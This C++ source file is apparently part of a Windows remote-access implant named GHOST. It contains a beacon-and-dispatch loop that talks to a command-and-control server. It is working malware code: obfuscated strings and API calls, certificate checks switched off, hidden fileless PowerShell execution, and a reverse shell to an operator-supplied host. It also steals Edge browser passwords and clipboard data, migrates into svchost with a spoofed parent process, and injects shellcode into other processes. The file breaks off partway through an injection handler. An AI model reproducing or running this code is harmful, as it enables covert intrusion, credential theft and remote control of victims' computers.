// c2.cpp — GHOST C2 beacon loop and command dispatcher
#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include "injection.hpp"
#include "keylog.hpp"
#include "persistence.hpp"
#include "vnc.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <fstream>
#include <stdio.h>
#include <random>
#include <wincrypt.h>
#include <cwctype>

// ─── No pragma – linked via build.sh ──────────────────────────────────────

namespace config {
    static wchar_t s_BeaconToken[65] = {};
    static wchar_t s_UserAgent[32]   = {};
    static bool    s_ConfigInit      = false;

    static void EnsureInit() {
        if (s_ConfigInit) return;
        auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        auto ua  = XSW(L"Microsoft-WNS/10.0");
        wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
        wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
        s_ConfigInit = true;
    }

    const wchar_t* GetBeaconToken() { EnsureInit(); return s_BeaconToken; }
    const wchar_t* GetUserAgent()   { EnsureInit(); return s_UserAgent;   }

#ifndef GHOST_C2_PORT
#define GHOST_C2_PORT 443
#endif
    const uint16_t C2_PORT = GHOST_C2_PORT;
}

static std::wstring g_SessionId;
static std::vector<BYTE> g_SessionKey;
static HANDLE g_StolenToken    = NULL;  // primary token from steal_token
static DWORD  g_BeaconOverride = 0;     // seconds; 0 = use config defaults

// Channel state — AES-GCM is only used once the ECDH handshake has produced
// a key. The implant holds an ephemeral P-256 keypair per run (utils.cpp);
// the server's public point arrives in every beacon response ("spk").
static bool        g_ChannelUp = false;
static std::string g_SrvPubB64;          // last accepted server public point

// ─── No globals for Telegram credentials – they are embedded via XSW inside functions ───

// =====================================================================
//  DEBUG LOGGING
// =====================================================================
#ifdef DEBUG
static void DebugLog(const wchar_t* msg) {
    OutputDebugStringW(L"[C2] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\n");
    char narrow[1024];
    int n = WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow) - 3, nullptr, nullptr);
    if (n > 0) {
        narrow[n - 1] = '\r'; narrow[n] = '\n'; narrow[n + 1] = '\0';
        HANDLE hf = CreateFileA("C:\\Users\\Public\\g_dbg.log",
            FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD w; WriteFile(hf, narrow, n + 1, &w, NULL);
            CloseHandle(hf);
        }
    }
}
static void DebugLog(const std::wstring& msg) { DebugLog(msg.c_str()); }
#else
static void DebugLog(const wchar_t*) {}
static void DebugLog(const std::wstring&) {}
#endif

// =====================================================================
//  JSON HELPERS
// =====================================================================
static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return {};
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return {};
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return {};
    size_t start = pos + 1, end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    std::string raw = json.substr(start, end - start);
    std::string result;
    result.reserve(raw.size());

    auto appendCodepoint = [&result](unsigned cp) {
        if (cp < 0x80) {
            result += static_cast<char>(cp);
        } else if (cp < 0x800) {
            result += static_cast<char>(0xC0 | (cp >> 6));
            result += static_cast<char>(0x80 | (cp & 0x3F));
        } else {
            result += static_cast<char>(0xE0 | (cp >> 12));
            result += static_cast<char>(0x80 | ((cp >> 6) & 0x3F));
            result += static_cast<char>(0x80 | (cp & 0x3F));
        }
    };
    auto parseHex4 = [&](size_t at, unsigned& cp) -> bool {
        if (at + 4 > raw.size()) return false;
        cp = 0;
        for (size_t k = 0; k < 4; ++k) {
            char h = raw[at + k];
            cp <<= 4;
            if (h >= '0' && h <= '9')      cp |= static_cast<unsigned>(h - '0');
            else if (h >= 'a' && h <= 'f') cp |= static_cast<unsigned>(h - 'a' + 10);
            else if (h >= 'A' && h <= 'F') cp |= static_cast<unsigned>(h - 'A' + 10);
            else return false;
        }
        return true;
    };

    for (size_t i = 0; i < raw.size(); ++i) {
        if (raw[i] == '\\' && i + 1 < raw.size()) {
            switch (raw[++i]) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case '/':  result += '/';  break;
                case 'b':  result += '\b'; break;
                case 'f':  result += '\f'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case 'u': {
                    unsigned cp = 0;
                    if (!parseHex4(i + 1, cp)) { result += 'u'; break; }
                    i += 4;
                    // Surrogate pair → single codepoint
                    if (cp >= 0xD800 && cp <= 0xDBFF &&
                        i + 6 < raw.size() &&
                        raw[i + 1] == '\\' && raw[i + 2] == 'u') {
                        unsigned lo = 0;
                        if (parseHex4(i + 3, lo) && lo >= 0xDC00 && lo <= 0xDFFF) {
                            cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00);
                            i += 6;
                        }
                    }
                    appendCodepoint(cp);
                    break;
                }
                default:   result += raw[i]; break;
            }
        } else {
            result += raw[i];
        }
    }
    return result;
}

// True when `"key":1` appears in the JSON — whitespace-tolerant, since Flask
// pretty-prints (": 1") in debug mode and compacts (":1") in production.
static bool JsonFlag(const std::string& json, const char* key) {
    std::string needle = std::string("\"") + key + "\"";
    auto pos = json.find(needle);
    while (pos != std::string::npos) {
        auto colon = json.find(':', pos + needle.size());
        if (colon != std::string::npos) {
            size_t v = colon + 1;
            while (v < json.size() && (json[v] == ' ' || json[v] == '\t')) ++v;
            if (v < json.size() && json[v] == '1') return true;
        }
        pos = json.find(needle, pos + 1);
    }
    return false;
}

// =====================================================================
//  WINHTTP TRANSPORT (RAII)
// =====================================================================
struct WinHttpHandles {
    HINTERNET session = nullptr, connect = nullptr, request = nullptr;
    ~WinHttpHandles() {
        static HMODULE hW = []() -> HMODULE {
            HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
            return m ? m : LoadLibraryA(XS("winhttp.dll"));
        }();
        if (!hW) return;
        auto _Close = HASHPROC(hW, WinHttpCloseHandle);
        if (_Close) {
            if (request) _Close(request);
            if (connect) _Close(connect);
            if (session) _Close(session);
        }
    }
};

struct HttpResponse { DWORD status = 0; std::string body; };

static HttpResponse WinHttpRequest(
    const std::wstring& host, INTERNET_PORT port,
    const std::wstring& verb, const std::wstring& path,
    const std::string& body, const std::wstring& extraHeaders = L"")
{
    HttpResponse resp;
    static HMODULE hW = LoadLibraryA(XS("winhttp.dll"));
    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }

    auto _Open          = HASHPROC(hW, WinHttpOpen);
    auto _Connect       = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest   = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption     = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders    = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest   = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp   = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryHeaders  = HASHPROC(hW, WinHttpQueryHeaders);
    auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData      = HASHPROC(hW, WinHttpReadData);

    if (!_Open || !_Connect || !_OpenRequest) {
        DebugLog(L"Failed to resolve WinHTTP functions");
        return resp;
    }

    WinHttpHandles h;
    // Try automatic proxy first (respects system/IE proxy settings)
    h.session = _Open(config::GetUserAgent(),
                      WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h.session) {
        // Fallback: direct connect
        h.session = _Open(config::GetUserAgent(),
                          WINHTTP_ACCESS_TYPE_NO_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    }
    if (!h.session) {
        DebugLog(L"WinHttpOpen failed");
        return resp;
    }

    DWORD timeout = 45000;
    if (_SetOption) {
        _SetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
        _SetOption(h.session, WINHTTP_OPTION_RESOLVE_TIMEOUT, &timeout, sizeof(timeout));
    }

    h.connect = _Connect(h.session, host.c_str(), port, 0);
    if (!h.connect) {
        DebugLog(L"WinHttpConnect failed");
        return resp;
    }

    h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
    if (!h.request) {
        DebugLog(L"WinHttpOpenRequest failed");
        return resp;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
    auto ngrokHdr = XSW(L"\r\nngrok-skip-browser-warning: true");
    std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + ngrokHdr.str() + L"\r\n";
    if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
    if (_AddHeaders)
        _AddHeaders(h.request, hdrs.c_str(),
                    static_cast<DWORD>(hdrs.size()), WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(h.request,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             body.empty() ? WINHTTP_NO_REQUEST_DATA
                                          : const_cast<char*>(body.data()),
                             static_cast<DWORD>(body.size()),
                             static_cast<DWORD>(body.size()), 0);
    if (!sent || !_ReceiveResp(h.request, nullptr)) {
        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
        return resp;
    }

    DWORD statusSize = sizeof(resp.status);
    if (_QueryHeaders)
        _QueryHeaders(h.request,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      WINHTTP_HEADER_NAME_BY_INDEX,
                      &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);

    DebugLog(L"Status: " + std::to_wstring(resp.status));

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(h.request, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
    }
    return resp;
}

// =====================================================================
//  GENERIC HTTP/HTTPS GET (for download command — no beacon token header)
// =====================================================================
static HttpResponse WinHttpDownload(const std::wstring& url) {
    HttpResponse resp;
    static HMODULE hW = []() -> HMODULE {
        HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
        return m ? m : LoadLibraryA(XS("winhttp.dll"));
    }();
    if (!hW) return resp;

    auto _CrackUrl    = HASHPROC(hW, WinHttpCrackUrl);
    auto _Open        = HASHPROC(hW, WinHttpOpen);
    auto _Connect     = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption   = HASHPROC(hW, WinHttpSetOption);
    auto _SendRequest = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryAvail  = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData    = HASHPROC(hW, WinHttpReadData);
    auto _Close       = HASHPROC(hW, WinHttpCloseHandle);

    if (!_CrackUrl || !_Open || !_Connect || !_OpenRequest || !_Close) return resp;

    wchar_t host[512] = {}, path[2048] = {};
    URL_COMPONENTS uc = {};
    uc.dwStructSize    = sizeof(uc);
    uc.lpszHostName    = host; uc.dwHostNameLength = 512;
    uc.lpszUrlPath     = path; uc.dwUrlPathLength  = 2048;
    if (!_CrackUrl(url.c_str(), 0, 0, &uc)) return resp;

    bool secure = (uc.nScheme == INTERNET_SCHEME_HTTPS);
    HINTERNET hSes = _Open(config::GetUserAgent(),
                           WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return resp;

    DWORD timeout = 45000;
    if (_SetOption) {
        _SetOption(hSes, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(hSes, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    }

    HINTERNET hCon = _Connect(hSes, host, uc.nPort, 0);
    if (!hCon) { _Close(hSes); return resp; }

    HINTERNET hReq = _OpenRequest(hCon, L"GET", path, nullptr,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  secure ? WINHTTP_FLAG_SECURE : 0);
    if (!hReq) { _Close(hCon); _Close(hSes); return resp; }

    if (secure && _SetOption) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        _SetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    if (!_SendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !_ReceiveResp(hReq, nullptr)) {
        _Close(hReq); _Close(hCon); _Close(hSes);
        return resp;
    }

    DWORD statusSz = sizeof(resp.status);
    auto _QueryHdrs = HASHPROC(hW, WinHttpQueryHeaders);
    if (_QueryHdrs)
        _QueryHdrs(hReq,
                   WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                   WINHTTP_HEADER_NAME_BY_INDEX,
                   &resp.status, &statusSz, WINHTTP_NO_HEADER_INDEX);

    DWORD avail = 0;
    while (_QueryAvail && _QueryAvail(hReq, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD rd = 0;
        if (_ReadData && _ReadData(hReq, buf.data(), avail, &rd) && rd > 0)
            resp.body.append(buf.data(), rd);
        if (resp.body.size() > 64u * 1024 * 1024) break; // 64 MB cap
    }

    _Close(hReq); _Close(hCon); _Close(hSes);
    return resp;
}

// =====================================================================
//  C2 HOST — baked in at build time by build.sh (GHOST_C2_HOST define),
//  still XOR-obfuscated in the binary via XSW.
// =====================================================================
static std::wstring GetC2Host() {
    static wchar_t host[64] = {};
    if (host[0] == L'\0') {
        auto s = XSW(GHOST_C2_HOST);
        wcsncpy_s(host, s.str(), _TRUNCATE);
    }
    return std::wstring(host);
}

// =====================================================================
//  BEACON JSON BUILDER
// =====================================================================
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));
    std::ostringstream j;
    j << "{"
      << "\"session\":\""  << sid  << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\""     << user << "\","
      <<   "\"build\":"      << s.build << ","
      <<   "\"elevated\":"   << (s.elevated    ? "true" : "false") << ","
      <<   "\"amsi\":"       << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":"        << (s.etwPatched  ? "true" : "false") << ","
      <<   "\"hwbps\":"      << (s.hwbpsCleared? "true" : "false")
      << "}}";
    return j.str();
}

// =====================================================================
//  SEND BEACON (encrypted)
// =====================================================================
BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";
    std::string payload = BuildBeaconJson(session);

    // The implant's ephemeral public point rides in a header on every request
    // so the server can (re)derive the channel key at any time. The body is
    // AES-256-GCM only once the handshake has established a shared key.
    std::string  body  = payload;
    std::wstring extra = L"X-Session-ID: " + session.sessionId +
                         L"\r\nX-Pub-Key: " + UTF8ToWString(EcdhPublicKeyB64());
    if (g_ChannelUp) {
        std::string blob = AesGcmEncrypt(g_SessionKey, payload);
        if (!blob.empty()) {
            body  = blob;
            extra += L"\r\nX-Enc: 1";
        } else {
            g_ChannelUp = false;   // BCrypt failure — plaintext until re-handshake
        }
    }

    DebugLog(L"Sending beacon to " + GetC2Host());
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/beacon", body, extra);

    if ((resp.status == 400 || resp.status == 401) && g_ChannelUp) {
        DebugLog(L"server rejected encrypted beacon — re-handshaking");
        g_ChannelUp = false;
        return FALSE;
    }
    if (resp.status != 200) {
        DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
        return FALSE;
    }

    // Server public point — establish/refresh the channel key BEFORE parsing
    // the task, since the response cmd may already be encrypted with it.
    std::string spk = JsonGetString(resp.body, "spk");
    if (!spk.empty() && spk != g_SrvPubB64) {
        std::vector<BYTE> key32;
        if (EcdhDeriveSessionKey(spk, key32)) {
            g_SessionKey = key32;
            g_SrvPubB64  = spk;
            g_ChannelUp  = true;
            DebugLog(L"channel key established (ECDH P-256)");
        } else {
            DebugLog(L"spk derive failed — staying unencrypted this round");
        }
    }

    std::string cmd = JsonGetString(resp.body, "cmd");
    if (!cmd.empty()) {
        if (JsonFlag(resp.body, "e")) {
            // Encrypted blob decrypts to {"cmd":"<task>"} — unpack the field.
            std::string dec = AesGcmDecrypt(g_SessionKey, cmd);
            if (dec.empty()) {
                DebugLog(L"cmd decrypt failed — re-handshaking");
                g_ChannelUp = false;
                return FALSE;
            }
            taskOut = UTF8ToWString(JsonGetString(dec, "cmd"));
        } else {
            taskOut = UTF8ToWString(cmd);
        }
        DebugLog(L"Task received: " + taskOut);
    }
    return TRUE;
}

// =====================================================================
//  SEND RESULT (encrypted)
// =====================================================================
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));
    std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";
    std::wstring extra = L"X-Session-ID: " + sessionId +
                         L"\r\nX-Pub-Key: " + UTF8ToWString(EcdhPublicKeyB64());
    if (g_ChannelUp) {
        std::string blob = AesGcmEncrypt(g_SessionKey, body);
        if (!blob.empty()) {
            body  = blob;
            extra += L"\r\nX-Enc: 1";
        } else {
            g_ChannelUp = false;
        }
    }
    DebugLog(L"Sending result " + std::to_wstring(output.size()) + L" chars");
    HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                       L"POST", L"/result", body, extra);
    if ((resp.status == 400 || resp.status == 401) && g_ChannelUp) {
        DebugLog(L"result rejected — re-handshaking on next beacon");
        g_ChannelUp = false;
        return FALSE;
    }
    return (resp.status == 200);
}

// =====================================================================
//  FILELESS POWERSHELL EXECUTOR
// =====================================================================
static std::wstring RunFilelessPS(const std::string& b64Command) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring ps = std::wstring(sysRoot) +
                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                           L"-EncodedCommand " + UTF8ToWString(b64Command);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return L"[error: pipe failed]";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.hStdInput  = nullptr; // no console in -mwindows build; NULL avoids INVALID_HANDLE crash

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return L"[error: CreateProcess failed]";
    }

    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;
    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }
    if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT)
        TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return UTF8ToWString(output);
}

// =====================================================================
//  CLIPBOARD — read or write system clipboard
// =====================================================================
static std::wstring HandleClipboard(const std::string& args) {
    if (args.empty()) {
        // Read clipboard
        if (!OpenClipboard(nullptr)) return L"[error: OpenClipboard]";
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (!hData) { CloseClipboard(); return L"[clipboard: empty or non-text]"; }
        auto* p = static_cast<wchar_t*>(GlobalLock(hData));
        std::wstring out = p ? std::wstring(p) : L"[clipboard: lock failed]";
        GlobalUnlock(hData);
        CloseClipboard();
        return out;
    }
    // Write to clipboard
    std::wstring wText = UTF8ToWString(args);
    SIZE_T bytes = (wText.size() + 1) * sizeof(wchar_t);
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, bytes);
    if (!hMem) return L"[error: GlobalAlloc]";
    memcpy(GlobalLock(hMem), wText.c_str(), bytes);
    GlobalUnlock(hMem);
    if (!OpenClipboard(nullptr)) { GlobalFree(hMem); return L"[error: OpenClipboard]"; }
    EmptyClipboard();
    SetClipboardData(CF_UNICODETEXT, hMem);
    CloseClipboard();
    return L"[+] Clipboard set (" + std::to_wstring(wText.size()) + L" chars)";
}

// =====================================================================
//  REVERSE SHELL — built from parts at runtime, no static b64 blob
// =====================================================================
static std::wstring HandleReverse(const std::string& args) {
    if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
    std::string ip, port = "443";
    size_t colon = args.find(':');
    if (colon == std::string::npos) {
        ip = args;
    } else {
        ip = args.substr(0, colon);
        port = args.substr(colon + 1);
    }

    // Build PS script from XSW parts — no complete script literal in binary
    auto p1  = XSW(L"$c=New-Object System.Net.Sockets.TcpClient('");
    auto p2  = XSW(L"',");
    auto p3  = XSW(L");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};");
    auto p4  = XSW(L"while(($i=$s.Read($b,0,$b.Length)) -ne 0){");
    auto p5  = XSW(L"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);");
    auto p6  = XSW(L"$sb=(iex $d 2>&1 | Out-String);");
    auto p7  = XSW(L"$sb2=$sb+'PS '+(pwd).Path+'> ';");
    auto p8  = XSW(L"$sbt=([text.encoding]::ASCII).GetBytes($sb2);");
    auto p9  = XSW(L"$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()");

    std::wstring wScript = std::wstring(p1.str()) + UTF8ToWString(ip)
                         + p2.str() + UTF8ToWString(port)
                         + p3.str() + p4.str() + p5.str()
                         + p6.str() + p7.str() + p8.str() + p9.str();

    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()),
                                   wScript.size() * sizeof(wchar_t));
    RunFilelessPS(b64);
    return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
}

// =====================================================================
//  BROWSER CREDENTIALS — script built from XSW parts, no static b64 blob
// =====================================================================
static std::wstring HandleBrowser(const std::string& /*args*/) {
    // Query Edge Login Data via SQLite-backed Csharp provider
    auto p1 = XSW(L"$r=@\n\"select username_value, password_value from logins\"@\n;");
    auto p2 = XSW(L"$path=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\";");
    auto p3 = XSW(L"$creds='';");
    auto p4 = XSW(L"if(Test-Path $path){");
    auto p5 = XSW(L"$tmp=[System.IO.Path]::GetTempFileName();");
    auto p6 = XSW(L"Copy-Item $path $tmp -Force;");
    auto p7 = XSW(L"Add-Type -AssemblyName System.Data;");
    auto p8 = XSW(L"$cn=New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$tmp;Version=3;\");");
    auto p9 = XSW(L"try{$cn.Open();$cmd=$cn.CreateCommand();");
    auto pa = XSW(L"$cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins';");
    auto pb = XSW(L"$rd=$cmd.ExecuteReader();");
    auto pc = XSW(L"while($rd.Read()){$url=$rd[0];$user=$rd[1];");
    auto pd = XSW(L"$enc=[byte[]]$rd[2];");
    auto pe = XSW(L"$dec=[System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);");
    auto pf = XSW(L"$pw=[System.Text.Encoding]::UTF8.GetString($dec);");
    auto pg = XSW(L"$creds+=\"$url | $user | $pw`n\"}}catch{}finally{$cn.Close();Remove-Item $tmp -Force}};$creds");

    std::wstring wScript = std::wstring(p1.str()) + p2.str() + p3.str() + p4.str()
                         + p5.str() + p6.str() + p7.str() + p8.str() + p9.str()
                         + pa.str() + pb.str() + pc.str() + pd.str() + pe.str()
                         + pf.str() + pg.str();

    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()),
                                   wScript.size() * sizeof(wchar_t));
    std::wstring result = RunFilelessPS(b64);
    return L"Browser data:\n" + result;
}


// =====================================================================
//  STUB HANDLERS
// =====================================================================
// Set to non-zero to signal BeaconLoop to exit cleanly after migrate.
static volatile DWORD g_MigrateExit = 0;

static std::wstring HandleMigrate(const std::string& args) {
    DWORD svchostPid = args.empty() ? FindBestSvchost()
                                    : static_cast<DWORD>(atol(args.c_str()));
    if (!svchostPid) return L"[error: no svchost pid found]";

    wchar_t selfPath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    // Set sentinel so the child skips the mutex check (we'll release it when
    // WinMain exits after 0xDEAD).
    SetEnvironmentVariableW(L"__GHOST_SPAWNED", L"1");
    HANDLE hChild = nullptr, hThread = nullptr;
    if (!SpawnWithPPID(selfPath, svchostPid, &hChild, &hThread)) {
        SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);
        return L"[error: SpawnWithPPID failed (pid=" + std::to_wstring(svchostPid) + L")]";
    }
    SetEnvironmentVariableW(L"__GHOST_SPAWNED", nullptr);

    ResumeThread(hThread);
    DWORD childPid = GetProcessId(hChild);
    CloseHandle(hThread);
    CloseHandle(hChild);

    // Signal beacon loop to exit — WinMain exits → mutex released → child acquires it.
    g_MigrateExit = 1;

    return L"[+] Migrated → svchost pid=" + std::to_wstring(svchostPid)
         + L" child pid=" + std::to_wstring(childPid) + L" (this instance exiting)";
}

static std::wstring HandleInject(const std::string& args) {
    // args: "<pid> <hex shellcode bytes space-separated>"
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: !inject <pid> <hex bytes...>";
    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
    if (!pid) return L"[error: invalid pid]";
    std::string hexStr = args.substr(sp + 1);
    std::vector<BYTE> sc;
    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
        if (hexStr[i] == ' ') { --i; continue; }
        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
    }
    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
    BOOL ok = InjectRemoteProcess(pid, sc.data(), sc.size(), nullptr);
    return ok ? L"[+] Injected " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
              : L"[error: injection failed]";
}

static std::wstring HandleInjectApc(const std::string& args) {
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: !inject-apc <pid> <hex bytes...>";
    DWORD pid = static_cast<DWORD>(atol(args.substr(0, sp).c_str()));
    if (!pid) return L"[error: invalid pid]";
    std::string hexStr = args.substr(sp + 1);
    std::vector<BYTE> sc;
    for (size_t i = 0; i + 1 < hexStr.size(); i += 2) {
        if (hexStr[i] == ' ') { --i; continue; }
        sc.push_back(static_cast<BYTE>(strtol(hexStr.substr(i, 2).c_str(), nullptr, 16)));
    }
    if (sc.empty()) return L"[error: no shellcode bytes parsed]";
